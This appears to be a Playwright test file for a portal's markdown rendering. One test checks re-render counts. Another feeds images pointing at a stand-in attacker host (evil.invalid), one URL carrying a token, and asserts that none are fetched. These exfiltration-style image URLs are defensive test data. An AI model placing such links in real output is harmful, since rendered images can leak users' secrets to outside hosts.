import { test, expect } from './portal-mock';

/** The portal's markdown, as a reply, a note or a fetched page is drawn with it. */
const page = (text: string) => `/tests/markdown.html?text=${encodeURIComponent(text)}`;

test('a reply that has not changed is not drawn again when the page around it is', async ({ page: p }) => {
  await p.goto(page('# Title\n\n```js\nconst a = 1;\n```\n\nSome *words*.'));
  await expect(p.getByText('Some words.')).toBeVisible();
  const drawn = () => p.evaluate(() => ({ ...(window as any).drawn }) as { markdown: number; streamdown: number });
  const first = await drawn();
  // They were drawn once: the count is what a draw looks like.
  expect(first.markdown).toBeGreaterThan(0);
  expect(first.streamdown).toBeGreaterThan(0);
  for (let i = 1; i <= 5; i++) {
    await p.getByRole('button', { name: 'Redraw' }).click();
    await expect(p.locator('output')).toHaveText(String(i));
  }
  expect(await drawn()).toEqual(first);
});

test('a picture on another site is not asked for, by markdown or by the html in it, and says where it was', async ({ page: p }) => {
  const asked: string[] = [];
  await p.route((url) => url.hostname === 'evil.invalid', (route) => {
    asked.push(route.request().url());
    return route.abort();
  });
  await p.goto(
    page(
      [
        'Before.',
        '',
        '![secret](https://evil.invalid/a.png?token=1)',
        '',
        '<img src="https://evil.invalid/b.png" alt="raw">',
        '',
        '<picture><source srcset="https://evil.invalid/c.png"><img alt="inner" src="/own.png"></picture>',
        '',
        'After.',
      ].join('\n'),
    ),
  );
  await expect(p.getByText('After.')).toBeVisible();
  await expect(p.getByText('Picture from evil.invalid not loaded').first()).toBeVisible();
  await p.waitForTimeout(500);
  expect(asked).toEqual([]);
  // What is the portal's own still loads.
  await expect(p.locator('img[src="/own.png"]')).toHaveCount(1);
});
